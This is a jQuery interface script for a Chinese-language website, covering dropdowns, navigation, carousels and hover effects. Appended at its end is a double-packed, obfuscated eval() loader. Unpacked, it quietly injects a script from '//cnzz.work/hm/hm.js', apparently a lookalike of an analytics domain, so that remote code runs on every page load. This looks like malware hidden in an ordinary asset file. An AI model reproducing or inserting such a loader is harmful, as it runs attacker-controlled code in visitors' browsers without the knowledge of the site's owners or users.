$(function(){

	$(function(){	
			$('.beautify_input').cssSelect();
		});


	/*首页搜索下拉*/
	$(".drop_down").click(function(event) {
		if (event.stopPropagation) {
			//阻止时间冒泡
			event.stopPropagation(); 
			$(".dd_list").slideToggle(200)
		}else{
			event.cancelBubble = true;
			$(".dd_list").slideToggle(200)
		};
	});

	$(".dd_list span").click(function(event) {
		var val = $(this).html();

		$(".dd_list").slideUp(200);
		$(this).addClass('current_dd_span').siblings().removeClass('current_dd_span');
		$(".drop_down").html(val);

	});


	//点击空白处收起
	$("body").click(function(event) {
		$(".dd_list").slideUp(200);
	});

	/*导航下拉*/
/*	$(".nav ul li").hover(function() {
		$(this).find('.nav_dd').stop().slideToggle(200);
	});
*/
	$(".nav ul li").hover(function() {
		var nn = $(this).find('.nav_dd').innerHeight();

		$(this).find('.nav_dd').stop().slideDown(200);
		$(".zz_nav").stop().animate({'height':nn}, 200) //导航遮罩

	}, function() {
		var nn = $(this).find('.nav_dd').innerHeight();

		$(this).find('.nav_dd').stop().slideUp(200);
		$(".zz_nav").stop().animate({'height':0}, 200) //导航遮罩
	});



	/*自定义轮播*/
	$(".small_pic a").hover(function() {
		var index = $(".small_pic a").index(this);

		$(".big_pic a").eq(index).stop().fadeIn(100).siblings().stop().fadeOut(100);
		$(this).addClass('current_small_pic_a').siblings().removeClass('current_small_pic_a')
	});

	/*案例遮罩*/
	$(".anli_content ul li").hover(function() {
		$(this).find('.anli_zz').stop().animate({top:0,opacity:'1'}, 300)
	},function(){
		$(this).find('.anli_zz').stop().animate({top:'100%',opacity:0}, 300)
	});

	/*右侧定位导航*/
	$(".tel,.QQ,.back_top").hover(function() {
		$(this).find('a').stop().animate({'width':'140px','left':'-80px'}, 300)
	},function(){
		$(this).find('a').stop().animate({'width':'60px','left':0}, 300)
	});

	$(".side_nav .sub_QR").addClass('side_nav_3')//控制二维码
	$(".side_nav .sub_QR").hover(function() {
		$(this).find('span').stop().toggle(300)
	});



	/*细节样式*/
	$(".zhuanjia_list ul li").first().siblings().css('margin-left', '6px');
	$(".txtMarquee-left").slide({mainCell:".bd ul",autoPlay:true,effect:"leftMarquee",vis:2,interTime:30});
	$(".slideBox").slide({mainCell:".bd ul",effect:"fold",autoPlay:true});

	$(".slideBox .hd ul").css('margin-left', -$(".slideBox .hd ul").width()/2);

	$(".picScroll-left").slide({titCell:".hd ul",mainCell:".bd ul",autoPage:true,effect:"leftLoop",autoPlay:true,vis:4,trigger:"click"});

	$(".ks_title_icon").eq(0).addClass('cur_bg_one');
	$(".ks_title_icon").eq(1).addClass('cur_bg_two');
	$(".ks_title_icon").eq(2).addClass('cur_bg_three');
	$(".ks_title_icon").eq(3).addClass('cur_bg_four');

	//子页导航动画按钮
	
	


	aaa(43)//li的高度
	
	function aaa(hh){

		var h = hh;

		var ul = $("#left-type"); //
		var index_i = 0; //计数器
		var allH = $(".con1_class").height(); //容器高
		var oneN = parseInt(allH/h)-1; //容器内的个数

		$(".class_down").click(function(event) {
			var length = parseInt($("#left-type").height()/h);

			index_i++;

			if(index_i>=length-oneN){
				index_i = 0;
			}
			ul.stop().animate({top:-(index_i*h)}, 200)
		});

		$(".class_up").click(function(event) {
			var length = $("#left-type li").length;
			index_i--;
			if(index_i == -1){
				index_i = 0;
			}
			ul.stop().animate({top:-(index_i*h)}, 200)
		});
	}

});
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))